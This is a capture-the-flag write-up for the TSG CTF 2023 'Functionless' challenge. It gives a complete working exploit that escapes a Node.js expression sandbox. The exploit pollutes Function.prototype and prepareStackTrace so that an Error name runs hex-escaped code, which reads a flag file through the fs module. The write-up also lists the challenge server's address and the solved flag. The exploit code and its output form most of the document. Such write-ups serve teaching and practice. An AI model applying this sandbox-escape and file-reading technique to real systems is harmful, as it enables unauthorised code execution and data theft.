# TSG CTF 2023 - misc/Functionless

- 5 solves / 365 pts
- Author: n4o847

My solution:

```javascript
$ nc 34.84.217.62 30002
Welcome! Please input an expression.
> globalThis.constructor.constructor.prototype.toString = globalThis.constructor.constructor.prototype.call; Error.stackTraceLimit = 0; globalThis.constructor.prototype.prepareStackTrace = globalThis.constructor.constructor; const err = new Error; err.name = "x = \x28\x28\x29 => { const fs = process.mainModule.require\x28'fs'\x29; const filename = fs.readdirSync\x28'./'\x29.find\x28name => name.startsWith\x28'flag-'\x29\x29; console.log\x28fs.readFileSync\x28filename\x29.toString\x28\x29\x29 }\x29\x28\x29"; err
TSGCTF{i_like_functional_programming_how_about_you}

[undefined] {
  name: "x = (() => { const fs = process.mainModule.require('fs'); const filename = fs.readdirSync('./').find(name => name.startsWith('flag-')); console.log(fs.readFileSync(filename).toString()) })()"
}
```

## Steps

### Step 1

```javascript
globalThis.constructor.constructor.prototype.toString = globalThis.constructor.constructor.prototype.call;
```
This means `Function.prototype.toString = Function.prototype.call` where the `Function` is a host object.

By this prototype pollution, functions will be called when they are converted to primitive values.

### Step 2

```javascript
Error.stackTraceLimit = 0;
globalThis.constructor.prototype.prepareStackTrace = globalThis.constructor.constructor;
```
This pollutes `prepareStackTrace` to a constructor `Function`.

- `prepareStackTrace`: https://github.com/nodejs/node/blob/v20.9.0/lib/internal/errors.js#L140-L141
- Stack trace API: https://v8.dev/docs/stack-trace-api

`Error.stackTraceLimit = 0;` changes the second argument `trace` of `prepareStackTrace` to an empty array.

### Step 3

```javascript
const err = new Error;
err.name = "x = \x28\x28\x29 => { const fs = process.mainModule.require\x28'fs'\x29; const filename = fs.readdirSync\x28'./'\x29.find\x28name => name.startsWith\x28'flag-'\x29\x29; console.log\x28fs.readFileSync\x28filename\x29.toString\x28\x29\x29 }\x29\x28\x29";
err
```

When `console.log(err)` is executed, `Function(err, []).call()` will be executed and it will show a flag!

## Flag

```
TSGCTF{i_like_functional_programming_how_about_you}
```
